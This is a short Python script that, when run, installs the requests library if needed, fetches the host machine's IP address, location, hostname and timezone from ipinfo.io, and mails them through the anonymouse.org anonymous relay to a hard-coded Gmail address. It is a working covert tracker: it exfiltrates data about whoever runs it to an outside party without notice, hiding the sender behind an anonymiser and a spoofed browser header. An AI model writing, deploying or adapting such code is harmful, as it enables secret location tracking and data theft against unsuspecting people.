from os import system
import platform
try:
	import requests
except ImportError:
	if platform.system().lower() == "windows":
		x = system("py -m pip install requests")
		import requests
	else:
		x = system("python3 -m pip install requests")
		if x != 0:
			x = system("python -m pip install requests")
		import requests
	if x != 0:
		print("Modules missing!!\nInstall requests module")
	
#get ip,location,city,hostname,region,country,postal and timezone of the machine where the code is run
data = requests.get("https://ipinfo.io/")
msg = data.text
to = 'gowtham758550@gmail.com'
subject = 'check it'
message = msg

user_agent = 'Mozilla/5.0 (Windows NT 10.0;rv:78.0) Gecko/20100101 Firefox/78.0'
sess = requests.Session()
email_req = sess.post('http://anonymouse.org/cgi-bin/anon-email.cgi', headers={
	'Host': 'anonymouse.org',
	'User-Agent': user_agent,
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language': 'en-US,en;q=0.5',
	'Accept-Encoding': 'gzip, deflate',
	'Referer': 'http://anonymouse.org/anonemail.html',
        'Connection': 'close',
        'Upgrade-Insecure-Requests':'1',
        'Content-Type':'application/x-www-form-urlencoded'
}, data={
	'to': to,
	'subject': subject,
	'text': message
})


